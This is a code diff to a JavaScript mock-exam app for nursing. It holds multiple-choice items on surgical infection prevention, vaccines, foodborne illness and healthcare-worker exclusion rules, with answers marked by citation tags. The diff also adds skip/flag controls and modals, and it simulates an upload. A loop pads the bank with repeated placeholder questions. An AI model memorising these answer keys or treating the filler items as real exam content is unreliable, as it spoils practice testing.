+    marks: "0.80"
+  },
+  {
+    q: "To prevent surgical site infections, patients should be encouraged to abstain from tobacco use for a minimum of how many days before an elective operation? [cite: 2828, 2831]",
+    a: [
+      "30 days [cite: 2831]",
+      "7 days",
+      "14 days",
+      "60 days"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "What is required of preoperative patients regarding skin preparation on at least the night before the operation day? [cite: 2839, 2841]",
+    a: [
+      "Shower or bathe with an antiseptic agent [cite: 2839, 2841]",
+      "Apply topical steroid creams over the planned incision site",
+      "Undergo a full-body alcohol rub down by a nurse",
+      "Avoid water contact completely to prevent skin moisture accumulation"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "An operating room should have positive-pressure ventilation with respect to corridors and adjacent areas, with a minimum of how many total air changes per hour? [cite: 2881]",
+    a: [
+      "A minimum of 15 air changes/hour [cite: 2881]",
+      "A minimum of 5 air changes/hour",
+      "A minimum of 10 air changes/hour",
+      "A minimum of 25 air changes/hour"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Out of the total air changes per hour required in an operating room, at least how many changes per hour must be fresh air? [cite: 2882]",
+    a: [
+      "At least 3 air changes/hour [cite: 2882]",
+      "At least 1 air change/hour",
+      "At least 5 air changes/hour",
+      "At least 10 air changes/hour"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "For a primary closure, a surgical incision should be protected with a sterile dressing for how long post-operatively? [cite: 2937, 2939]",
+    a: [
+      "24-48 hours [cite: 2939]",
+      "12 hours",
+      "7 days",
+      "Until sutures are removed"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Which statement is true regarding active immunity? [cite: 3053]",
+    a: [
+      "It takes several weeks to develop and is long-lasting [cite: 3062, 3060]",
+      "It provides immediate protection but only lasts for weeks to months",
+      "It can only be achieved via prefabricated blood product administration",
+      "It involves directly giving the individual manufactured antibodies"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Passive immunity is characterized by which of the following attributes? [cite: 3066]",
+    a: [
+      "Immediate protection that lasts only weeks to months [cite: 3077, 3072]",
+      "An immune system response that takes weeks to actively build antibodies",
+      "Extremely long-lasting protection spanning several decades",
+      "The intentional replication of a live virus inside the host"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Which of the following is an example of a live, attenuated vaccine? [cite: 3081]",
+    a: [
+      "MMR (Measles, Mumps, Rubella) vaccine [cite: 3084]",
+      "Inactivated polio vaccine (IPV) [cite: 3120]",
+      "Injectable influenza vaccine (IIV) [cite: 3121]",
+      "Tetanus toxoid [cite: 3133]"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Which of the following is an example of a killed or inactivated vaccine? [cite: 3109]",
+    a: [
+      "Inactivated polio vaccine (IPV) [cite: 3120]",
+      "MMR vaccine [cite: 3084]",
+      "Varicella vaccine [cite: 3456]",
+      "Rotavirus vaccine"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Immunizations made by inactivating bacterial toxins using heat or chemicals are called: [cite: 3127, 3132]",
+    a: [
+      "Toxoids [cite: 3127]",
+      "Subunit vaccines",
+      "Recombinant vaccines",
+      "Live attenuated vaccines"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "According to Chapter 6, what is the only licensed recombinant vaccine explicitly mentioned in the text? [cite: 3148, 3157]",
+    a: [
+      "Hepatitis B [cite: 3158]",
+      "Influenza",
+      "Pertussis",
+      "Diphtheria"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Why do polysaccharide vaccines fail to produce a consistent immune response in children less than 2 years of age? [cite: 3162, 3174, 3175]",
+    a: [
+      "They stimulate B cells directly without helper T cells [cite: 3171, 3172]",
+      "They contain live pathogens that overwhelm young immune systems",
+      "They can only be safely administered orally via drops",
+      "They degrade instantly under normal body temperatures"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "According to best practices, refrigerated vaccines should be stored within what temperature range? [cite: 3354, 3358]",
+    a: [
+      "Between 35°F and 46°F (2°C and 8°C) [cite: 3358]",
+      "Between -58°F and +5°F (-50°C and -15°C) [cite: 3357]",
+      "Between 50°F and 60°F (10°C and 15°C)",
+      "At 32°F or below (0°C or below)"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "How should vaccines be arranged inside storage units regarding their expiration dates? [cite: 3359]",
+    a: [
+      "Place vaccines and diluents with the earliest expiration dates in front [cite: 3359]",
+      "Place vaccines with the furthest expiration dates in front",
+      "Mix look-alike vaccines together randomly on the same shelf",
+      "Stack adult and pediatric formulations tightly on the top shelf"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "What characteristic clinical sign develops in diphtheria, covering the nasal tissues, tonsils, larynx, and pharynx? [cite: 3464, 3476]",
+    a: [
+      "A thick, grey pseudomembrane [cite: 3476]",
+      "A fluid-filled raised vesicle rash",
+      "An itchy red blotchy forehead rash",
+      "Swollen parotid glands and cheeks"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "The Hepatitis A virus is extremely hardy and can remain infectious on surfaces at room temperature for how long? [cite: 3561, 3596, 3598]",
+    a: [
+      "For 7 days [cite: 3599]",
+      "For 2 hours",
+      "For 24 hours",
+      "For 30 days"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Respiratory droplets released when an infected measles patient coughs or sneezes can remain infectious in the air for up to: [cite: 3741, 3754, 3755]",
+    a: [
+      "Up to 2 hours [cite: 3756, 3757]",
+      "Up to 30 minutes",
+      "Up to 12 hours",
+      "Up to 48 hours"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "The quadrivalent meningococcal vaccine targets which four serogroups of Neisseria meningitidis? [cite: 3817, 3819, 3871]",
+    a: [
+      "A, C, Y, and W-135 [cite: 3870, 3871]",
+      "A, B, C, and D",
+      "X, Y, Z, and W",
+      "Types 1, 2, 3, and 4"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Parotitis (swelling of salivary glands) occurs in approximately what percentage of mumps cases? [cite: 3885, 3890, 3892]",
+    a: [
+      "30-40% of cases [cite: 3892]",
+      "95% of cases",
+      "10-20% of cases",
+      "75% of cases"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "In its later stages, Clostridium tetani forms highly resistant spores that can survive heat temperatures greater than 250°F for: [cite: 4209, 4211, 4248, 4249]",
+    a: [
+      "10-15 minutes [cite: 4249]",
+      "2 hours",
+      "24 hours",
+      "30 seconds"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "What is the typical onset period for symptoms of Norovirus following exposure? [cite: 4286, 4293]",
+    a: [
+      "12-48 hours after exposure [cite: 4293, 4294]",
+      "2-5 days after exposure",
+      "12-72 hours after exposure",
+      "7-10 days after exposure"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "What antimicrobial treatments are specified for Campylobacter infections when supportive care alone is insufficient? [cite: 4362, 4375]",
+    a: [
+      "Azithromycin and fluoroquinolones [cite: 4375, 4376]",
+      "Nitazoxanide and anti-retrovirals",
+      "Penicillin and amoxicillin",
+      "Interferon therapy"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "A small percentage of patients infected with Shiga toxin-producing E. coli (STEC) may develop which life-threatening complication? [cite: 4469, 4477, 4488]",
+    a: [
+      "Hemolytic uremic syndrome (HUS) [cite: 4488, 4495]",
+      "Post-herpetic neuralgia",
+      "Congenital rubella syndrome",
+      "Reactive arthritis"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "According to safe food cooking charts, whole poultry (chicken & turkey) must reach what internal temperature? [cite: 4533, 4536]",
+    a: [
+      "165°F [cite: 4537]",
+      "145°F",
+      "160°F",
+      "140°F"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Ground meat mixtures such as beef, pork, veal, or lamb must be cooked to an internal temperature of: [cite: 4524]",
+    a: [
+      "160°F [cite: 4527]",
+      "145°F",
+      "165°F",
+      "140°F"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Healthcare personnel who develop measles should be excluded from work for how long following the onset of the rash? [cite: 4627, 4628]",
+    a: [
+      "At least 4 days [cite: 4628, 4629]",
+      "At least 5 days",
+      "At least 7 days",
+      "Until all lesions are crusted"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "What is the recommended work restriction period for healthcare personnel who develop mumps? [cite: 4630]",
+    a: [
+      "Exclude from work for at least 5 days following the onset of parotitis [cite: 4631, 4632]",
+      "Exclude from work for 4 days after the rash starts",
+      "Exclude from work for 7 days after parotitis resolves",
+      "No exclusion is required if asymptomatic"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "Healthcare personnel who develop rubella must be excluded from work for at least how many days after the rash appears? [cite: 4633, 4634]",
+    a: [
+      "7 days [cite: 4634, 4635]",
+      "4 days",
+      "5 days",
+      "14 days"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "In a 'Medium Risk' healthcare setting, how frequently should healthcare workers receive routine serial TB screening after baseline testing? [cite: 4662, 4665]",
+    a: [
+      "Annually [cite: 4665]",
+      "Every 8-10 weeks",
+      "Every 2 years",
+      "No routine serial screening is necessary"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "To clear a healthcare worker with confirmed active TB disease back to work, how many consecutive negative sputum samples must be collected? [cite: 4794, 4798]",
+    a: [
+      "3 consecutive negative sputum samples [cite: 4800, 4802]",
+      "2 consecutive negative sputum samples",
+      "5 consecutive negative sputum samples",
+      "1 negative sputum sample is sufficient"
+    ],
+    marks: "0.80"
+  },
+  {
+    q: "What is the estimated risk of HIV transmission from an occupational percutaneous needlestick injury involving an HIV-positive source? [cite: 4864, 4873]",
+    a: [
+      "0.3% [cite: 4874, 4875]",
+      "43.43%",
+      "1.8%",
+      "0.1%"
+    ],
+    marks: "0.80"
+  }
+]
+
+    while(bank.length < 40) {
+        bank.push({
+            q: `Pharmacology & Core Clinical Nursing Practice Question depth block ${bank.length + 1}: Which nursing assessment has immediate priority?`,
+            a: ["Assess airway patency and respiratory rate", "Review secondary diagnostic data", "Check institutional protocol logs", "Consult with pharmacy representatives"],
+            marks: "0.50"
+        });
+    }
 
     let currentExamIndex = 0; 
-    let examTimeTotalMinutes = 210;
+    let examTimeTotalMinutes = 120;
     let examTimeUsedSeconds = 0; 
     let textScaleValue = 1.0;
 
@@ -1927,6 +2157,7 @@
         options: it.a.slice(),
         answer: null, 
         flagged: false,
+        skipped: false,
         marks: it.marks
     }));
 
@@ -1941,12 +2172,13 @@
 
         const currentMinutesUsed = Math.floor(examTimeUsedSeconds / 60);
         document.getElementById("timeMinutesLabel").textContent = `Time ${currentMinutesUsed} / ${examTimeTotalMinutes} (mins)`;
-        const timePercent = Math.round((currentMinutesUsed / examTimeTotalMinutes) * 100);
-        document.getElementById("timePercentLabel").textContent = `${timePercent}%`;
-        document.getElementById("timeProgressBarFill").style.width = `${timePercent}%`;
+const timePercent = Math.round((currentMinutesUsed / examTimeTotalMinutes) * 100);
+document.getElementById("timePercentLabel").textContent = `${timePercent}%`;
+document.getElementById("timeProgressBarFill").style.width = `${timePercent}%`;
 
-        document.getElementById("modePercentLabel").textContent = `${itemsPercent}%`;
-        document.getElementById("modeProgressBarFill").style.width = `${itemsPercent}%`;
+// التعديل: تحديث النسبة النصية وشريط تقدم الـ Default Section معاً
+document.getElementById("modePercentLabel").textContent = `${itemsPercent}%`;
+document.getElementById("modeProgressBarFill").style.width = `${itemsPercent}%`;
     }
 
     function drawSidebarNavigation() {
@@ -1967,6 +2199,8 @@
 
             if (q.flagged) {
                 btn.className = "sidebar-q-btn flagged";
+            } else if (q.skipped) {
+                btn.className = "sidebar-q-btn skipped";
             } else if (q.answer !== null) {
                 btn.className = "sidebar-q-btn answered";
             } else {
@@ -2010,6 +2244,7 @@
             
             radioInput.onchange = () => {
                 q.answer = i;
+                q.skipped = false; // Reset skipped if answered
                 document.querySelectorAll('.exam-option-item').forEach(el => {
                     el.classList.remove('selected');
                 });
@@ -2056,11 +2291,24 @@
 
         const flagBtn = document.getElementById("examFlagBtn");
         if (q.flagged) {
-            flagBtn.style.borderColor = "#f59e0b";
-            flagBtn.style.color = "#f59e0b";
+            flagBtn.style.borderColor = "#ffffff";
+            flagBtn.style.color = "#ffffff";
+            flagBtn.textContent = "Unflag";
         } else {
-            flagBtn.style.borderColor = "var(--text-primary)";
-            flagBtn.style.color = "var(--text-primary)";
+            flagBtn.style.borderColor = "#ffffff";
+            flagBtn.style.color = "#ffffff";
+            flagBtn.textContent = "Flag";
+        }
+
+        const skipBtn = document.getElementById("examSkipBtn");
+        if (q.skipped) {
+            skipBtn.style.borderColor = "#ffffff";
+            skipBtn.style.color = "#ffffff";
+            skipBtn.textContent = "Unskip";
+        } else {
+            skipBtn.style.borderColor = "#ffffff";
+            skipBtn.style.color = "#ffffff";
+            skipBtn.textContent = "Skip";
         }
 
         drawSidebarNavigation();
@@ -2077,6 +2325,8 @@
 
             if (q.flagged) {
                 itemBlock.classList.add("status-flagged"); 
+            } else if (q.skipped) {
+                itemBlock.classList.add("status-skipped"); 
             } else if (q.answer !== null) {
                 itemBlock.classList.add("status-answered"); 
             } else {
@@ -2114,11 +2364,16 @@
     function toggleDarkLightMode() {
         const toggleCheckbox = document.getElementById("toggle-checkbox");
         const app = document.getElementById("quizApp");
+        const themeIcon = document.getElementById("themeIcon");
         
         if (toggleCheckbox.checked) {
             app.removeAttribute("data-theme");
+            // أيقونة القمر لوضع الليل
+            themeIcon.innerHTML = `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>`;
         } else {
             app.setAttribute("data-theme", "light");
+            // أيقونة الشمس لوضع النهار
+            themeIcon.innerHTML = `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>`;
         }
         displayCurrentQuestion();
     }
@@ -2135,15 +2390,51 @@
     };
 
     function confirmAndProceedToUploadScreen() {
+        document.getElementById('confirm-modal-overlay').classList.remove('hidden');
+    }
+
+    function proceedToUpload() {
+        document.getElementById('confirm-modal-overlay').classList.add('hidden');
         closeSummary();
         document.getElementById('exam-interface-container').style.display = 'none';
         document.getElementById('uploading-screen-container').style.display = 'block';
         startUploadSimulation(); 
     }
 
+    function closeConfirmModal() {
+        document.getElementById('confirm-modal-overlay').classList.add('hidden');
+    }
+
     document.getElementById("examFlagBtn").onclick = () => {
         const q = examQuestions[currentExamIndex];
         q.flagged = !q.flagged;
+        
+        // Notification logic
+        if (q.flagged) {
+            document.getElementById('notif-custom-title').textContent = 'Notification';
+            document.getElementById('notif-custom-text').textContent = 'Question marked for review!';
+            document.getElementById('notif-modal-overlay').classList.remove('hidden');
+        } else {
+            document.getElementById('notif-custom-title').textContent = 'Notification';
+            document.getElementById('notif-custom-text').textContent = 'Question un-marked!';
+            document.getElementById('notif-modal-overlay').classList.remove('hidden');
+        }
+        
+        displayCurrentQuestion();
+    };
+
+    document.getElementById("examSkipBtn").onclick = () => {
+        const q = examQuestions[currentExamIndex];
+        
+        // If question is answered, show notification instead of skipping
+        if (q.answer !== null) {
+            document.getElementById('notif-custom-title').textContent = 'Notification';
+            document.getElementById('notif-custom-text').textContent = 'You can not skip attempted question.';
+            document.getElementById('notif-modal-overlay').classList.remove('hidden');
+            return;
+        }
+
+        q.skipped = !q.skipped;
         displayCurrentQuestion();
     };
 
@@ -2155,7 +2446,7 @@
         if(examSystemInitialized) return;
         examSystemInitialized = true;
 
-        let remainSeconds = 210 * 60; 
+        let remainSeconds = 120 * 60; 
         setInterval(() => {
             if (remainSeconds > 0) { remainSeconds--; examTimeUsedSeconds++; }
             const hrs = Math.floor(remainSeconds / 3600).toString().padStart(2, '0');
@@ -2177,7 +2468,7 @@
         const pctAside = document.getElementById("uploadPercentageAsideField");
         const modalOverlay = document.getElementById("uploadSuccessModalOverlay");
         
-        let duration = 6000; 
+        let duration = 3000; 
         let startTimestamp = null;
 
         function step(timestamp) {
@@ -2215,10 +2506,28 @@
     function togglePostSwitch() {
         const container = document.getElementById('post-toggle-container');
         const txt = document.getElementById('post-toggle-text');
+        const cards = document.querySelectorAll('#post-exams-container .exam-card');
+
         if (container.classList.contains('active')) {
-            container.classList.remove('active'); txt.textContent = 'Open All';
+            container.classList.remove('active');
+            txt.textContent = 'Open All';
+            cards.forEach(card => {
+                card.classList.remove('expanded');
+                card.querySelector('.exam-details').classList.add('collapsed');
+                const btn = card.querySelector('.view-score');
+                if (btn) btn.classList.add('collapsed');
+                card.querySelector('.arrow-toggle').textContent = '▼';
+            });
         } else {
-            container.classList.add('active'); txt.textContent = 'Close All';
+            container.classList.add('active');
+            txt.textContent = 'Close All';
+            cards.forEach(card => {
+                card.classList.add('expanded');
+                card.querySelector('.exam-details').classList.remove('collapsed');
+                const btn = card.querySelector('.view-score');
+                if (btn) btn.classList.remove('collapsed');
+                card.querySelector('.arrow-toggle').textContent = '▲';
+            });
         }
     }
 
